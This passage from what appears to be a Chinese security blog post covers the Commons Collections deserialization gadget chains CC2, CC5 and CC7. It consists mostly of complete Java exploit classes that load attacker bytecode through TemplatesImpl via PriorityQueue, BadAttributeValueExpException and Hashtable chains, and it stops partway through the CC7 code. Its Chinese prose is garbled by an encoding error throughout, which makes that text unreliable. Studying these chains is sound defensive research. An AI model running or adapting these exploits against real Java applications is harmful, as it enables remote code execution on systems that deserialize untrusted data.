é“¾æœ€åéƒ¨åˆ†æ˜¯ TemplatesImpl æ‰§è¡ŒåŠ¨æ€å­—èŠ‚ç ï¼Œå’Œ CC4 é“¾æœ€åçš„éƒ¨åˆ†æ˜¯ç›¸ç­‰çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥æ¬è¿›æ¥ã€‚</p><p>è¿˜æ˜¯è€æ–¹æ³•ï¼Œå…ˆåœ¨transformingComparatorå¯¹è±¡ä¸­ä¼ å…¥ä¸€ä¸ªæ— ç”¨çš„ä¸œè¥¿ï¼Œå†é€šè¿‡åå°„ä¿®æ”¹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br><span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br><span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>transformer.setAccessible(<span class="hljs-literal">true</span>);<br>transformer.set(transformingComparator, newTransformer);<br></code></pre></td></tr></table></figure><p>æ·»åŠ å€¼</p><p>è°ƒè¯•æ—¶å¯ä»¥çœ‹åˆ°è¿™è¡Œä»£ç ä¼ å…¥çš„obj1ä¼šä½œä¸ºtransformæ–¹æ³•çš„æ‰§è¡Œå¯¹è±¡</p><p>æˆ‘ä»¬éœ€è¦newTransformerå¯¹è±¡è°ƒç”¨transformæ–¹æ³•æ¥æ‰§è¡Œæˆ‘ä»¬åŠ è½½æ¶æ„å­—èŠ‚ç çš„æ“ä½œï¼Œæ‰€ä»¥è¦ä¼ å…¥æˆ‘ä»¬æ„é€ å¥½çš„templateså¯¹è±¡</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">priorityQueue.add(templates)<br></code></pre></td></tr></table></figure><p>æœ€ç»ˆEXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.comparators.TransformingComparator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections4.functors.InvokerTransformer;<br><br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC2EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IOException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br><br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates, codes);<br><br>        InvokerTransformer&lt;Object, Object&gt; newTransformer = <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>&lt;&gt;(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;&#125;);<br><br>        <span class="hljs-type">TransformingComparator</span> <span class="hljs-variable">transformingComparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformingComparator</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br><br>        <span class="hljs-type">PriorityQueue</span> <span class="hljs-variable">priorityQueue</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;&gt;(transformingComparator);<br><br>        priorityQueue.add(templates);<br>        priorityQueue.add(templates);<br><br>        <span class="hljs-comment">//åå°„ä¿®æ”¹å€¼</span><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">c</span> <span class="hljs-operator">=</span> transformingComparator.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">transformer</span> <span class="hljs-operator">=</span> c.getDeclaredField(<span class="hljs-string">&quot;transformer&quot;</span>);<br>        transformer.setAccessible(<span class="hljs-literal">true</span>);<br>        transformer.set(transformingComparator, newTransformer);<br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(priorityQueue);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><h1 id="CC5"><a href="#CC5" class="headerlink" title="CC5"></a>CC5</h1><h2 id="ç¯å¢ƒ-1"><a href="#ç¯å¢ƒ-1" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h2><ul><li>jdk8u65</li><li>Commons-Collections 3.2.1</li></ul><p><strong>Commons-Collections ç‰ˆæœ¬é™åˆ¶</strong></p><ul><li>CC5 ä¾èµ–çš„ <code>Transformer</code>ã€<code>ChainedTransformer</code>ã€<code>InvokerTransformer</code> åœ¨ <strong>3.1 &#x2F; 3.2.1</strong> ä¸­å¯ç”¨ã€‚</li><li>åœ¨ <strong>3.2.2+ å®˜æ–¹è¡¥ä¸</strong> ä¸­ï¼Œå±é™©çš„ Transformer è¢«ä¿®è¡¥ï¼Œå¯¼è‡´åˆ©ç”¨é“¾å¤±æ•ˆã€‚<br> ğŸ‘‰ æ‰€ä»¥ CC5 ä»ç„¶å— <strong>Commons-Collections ç‰ˆæœ¬é™åˆ¶</strong>ã€‚(ä¸CC3å—é™åˆ¶åŸå› ç›¸åŒ)</li><li>åœ¨4.0ç‰ˆæœ¬ä¸­ï¼ŒLazyMapç±»çš„decorateæ–¹æ³•è¢«åˆ é™¤ï¼Œæ— æ³•åˆ©ç”¨æ­¤æ–°å»ºå¯¹è±¡</li></ul><h2 id="åˆ†æè°ƒç”¨é“¾"><a href="#åˆ†æè°ƒç”¨é“¾" class="headerlink" title="åˆ†æè°ƒç”¨é“¾"></a>åˆ†æè°ƒç”¨é“¾</h2><p>cc5ä¸cc3çš„ä¸åŒåªæ˜¯è§¦å‘è°ƒç”¨LazyMapçš„getæ–¹æ³•ä¸åŒ</p><p><img src="/img/CC4/c12.png"></p><p>è¿™é‡Œä¾æ—§è´´ä¸€ä¸ªçœ‹åˆ°æ€»ç»“çš„å¾ˆå¥½çš„æµç¨‹å›¾</p><p><img src="/img/CC4/c11.png"></p><p>ä» <code>BadAttributeValueExpException</code> çš„ <code>readObject()</code> æ–¹æ³•è¿›æ¥</p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°å¯ä»¥é€šè¿‡ä¼ å‚ï¼Œä½¿å…¶è°ƒç”¨TiedMapEntryçš„toStringæ–¹æ³•</p><p><img src="/img/CC4/c13.png"></p><p>è¿›å…¥åˆ°TiedMapEntryç±»å¯ä»¥çœ‹åˆ°å®ƒçš„toStringæ–¹æ³•è°ƒç”¨äº†getValueæ–¹æ³•ï¼Œé€šè¿‡getValueæ–¹æ³•å¯ä»¥è°ƒç”¨LazyMapçš„getæ–¹æ³•</p><p><img src="/img/CC4/c14.png"></p><h2 id="ç¼–å†™EXP"><a href="#ç¼–å†™EXP" class="headerlink" title="ç¼–å†™EXP"></a>ç¼–å†™EXP</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC5EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">nameField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>        nameField.setAccessible(<span class="hljs-literal">true</span>);<br>        nameField.set(templates,<span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">bytecodesField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>        bytecodesField.setAccessible(<span class="hljs-literal">true</span>);<br>        <span class="hljs-type">byte</span>[] evil = Files.readAllBytes(Paths.get(<span class="hljs-string">&quot;D://Test.class&quot;</span>));<br>        <span class="hljs-type">byte</span>[][] codes = &#123;evil&#125;;<br>        bytecodesField.set(templates,codes);<br><br>        <span class="hljs-type">Field</span> <span class="hljs-variable">tfactoryField</span> <span class="hljs-operator">=</span> templatesClass.getDeclaredField(<span class="hljs-string">&quot;_tfactory&quot;</span>);<br>        tfactoryField.setAccessible(<span class="hljs-literal">true</span>);<br>        tfactoryField.set(templates, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-comment">//templates.newTransformer();</span><br><br>        <span class="hljs-type">InstantiateTransformer</span> <span class="hljs-variable">instantiateTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InstantiateTransformer</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;Templates.class&#125;,<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;templates&#125;);<br>        <span class="hljs-comment">//instantiateTransformer.transform(TrAXFilter.class);</span><br><br><br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[]&#123;<br>                <span class="hljs-comment">//è§¦å‘æ”»å‡»é“¾å­</span><br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(TrAXFilter.class),<br>                instantiateTransformer<br>        &#125;;<br><br><br>        <span class="hljs-type">ChainedTransformer</span> <span class="hljs-variable">chainedTransformer</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br><br>        <span class="hljs-comment">//ä¸CC1å‰åŠéƒ¨åˆ†é“¾å­ç»“åˆä¸€ä¸‹</span><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">map</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        Map&lt;Object, Object&gt; lazyMap = LazyMap.decorate(map,chainedTransformer);<br><br>        <span class="hljs-comment">//å®ä¾‹åŒ–TiedMapEntry</span><br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br>        tiedMapEntry.toString();<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br><br><br>        <span class="hljs-comment">// è§¦å‘åºåˆ—åŒ– + ååºåˆ—åŒ–</span><br>        serialize(badAttributeValueExpException);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> IOException &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>        oos.close();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> ois.readObject();<br>        ois.close();<br>        <span class="hljs-keyword">return</span> obj;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>é“¾å­å…¥å£å¤„</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">      <span class="hljs-comment">//å®ä¾‹åŒ–TiedMapEntry</span><br>      <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tiedMapEntry</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(lazyMap, <span class="hljs-string">&quot;enableTemplatesImplDeserialization&quot;</span>);<br>      tiedMapEntry.toString();<br><br><span class="hljs-comment">//æ„é€ æ–¹æ³•æ˜¯publicå¯ä»¥ç›´æ¥ä¼ å‚æ•°</span><br>      <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">badAttributeValueExpException</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(tiedMapEntry);<br><br></code></pre></td></tr></table></figure><p>æˆåŠŸå¼¹å‡ºè®¡ç®—å™¨</p><h1 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h1><h2 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h2><p>åŒæ ·åªæ˜¯æ›´æ”¹äº†è§¦å‘è°ƒç”¨LazyMapçš„getæ–¹æ³•</p><p><img src="/img/CC4/c15.png"></p><ul><li>å‰åŠæ¡é“¾å­çš„å…¥å£ç±»æ˜¯ <code>Hashtable</code>ï¼Œæˆ‘ä»¬è·Ÿè¿›å»çœ‹ä¸€ä¸‹ã€‚</li></ul><p><code>Hashtable</code> çš„å…¥å£ç±» <code>readObject()</code> æ–¹æ³•è°ƒç”¨äº†ä¸€ä¸ª <code>reconstitutionPut()</code> æ–¹æ³•ã€‚</p><p><code>reconstitutionPut()</code> æ–¹æ³•ä¸­æœ‰<code>equals</code>æ–¹æ³•çš„è°ƒç”¨</p><p>æ‰¾åˆ°äº†AbstractMapDecoratorç±»çš„equalsæ–¹æ³•</p><p>è¿™ä¸ªç±»æ˜¯ç»§æ‰¿äº† map æ¥å£ï¼Œå› ä¸ºå®ƒæ˜¯ CC åŒ…é‡Œé¢çš„ Map ç±»ï¼Œå¹¶ä¸”èƒ½å¤Ÿè°ƒç”¨çˆ¶ç±» Mapï¼Œæ‰€ä»¥æŠŠå®ƒä½œä¸ºé“¾å­çš„ä¸€éƒ¨åˆ†ã€‚ä½†æ˜¯ Map æ˜¯ä¸€ä¸ªæ¥å£ï¼Œæˆ‘ä»¬éœ€è¦å»æ‰¾ Map çš„å®ç°ç±»</p><p><img src="/img/CC4/c17.png"></p><p>æ‰¾åˆ°AbstractMapç±»çš„equalsæ–¹æ³•ä¸­ä¼šè°ƒç”¨getæ–¹æ³•ï¼Œå¯ä»¥è§¦å‘Lazy#getï¼Œä¸ååŠæ®µé“¾å­è¿æ¥èµ·æ¥</p><p>ä½†æ˜¯è¿™ä¸ªç±»ä¸èƒ½åºåˆ—åŒ–</p><p><img src="/img/CC4/c16.png"></p><h2 id="EXPç¼–å†™-1"><a href="#EXPç¼–å†™-1" class="headerlink" title="EXPç¼–å†™"></a>EXPç¼–å†™</h2><p>è¿™é‡Œå¯¹ä¼ è¿›çš„ Entry å¯¹è±¡æ•°ç»„è¿›è¡Œäº†å¾ªç¯ï¼Œé€ä¸ªè°ƒç”¨<code>e.key.equals(key)</code>ï¼Œè¿™é‡Œä¼ è¿›å»çš„å‚æ•°keyå¦‚æœæ˜¯æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£ä¹ˆ<code>AbstractMap.equals()</code>ä¸­çš„må°±æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚</p><ul><li>ä»æœ¬è´¨ä¸Šæ¥è¯´ï¼Œæˆ‘ä»¬éœ€è¦åœ¨å…¥å£ç±»è¿™é‡Œä¼ è¿›å»æ¶æ„çš„ keyï¼Œæ¥ç€è°ƒç”¨ key.equals() å³å¯ã€‚</li></ul><p>è¿™ä¸€æ®µä¼ å…¥æ¶æ„ key åº”å½“å¦‚æ­¤</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs JAVA"><span class="hljs-type">Hashtable</span> <span class="hljs-variable">hashtable</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>();  <br>hashtable.put(lazyMap, <span class="hljs-string">&quot;value&quot;</span>);<br></code></pre></td></tr></table></figure><p>EXP</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InstantiateTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.AbstractMapDecorator;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.nio.file.Files;<br><span class="hljs-keyword">import</span> java.nio.file.Paths;<br><span class="hljs-keyword">import</span> java.util.AbstractMap;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CC7EXP</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">templatesClass</span> <span class="hljs-operator">=</span> templates.getClass();<br>        <span 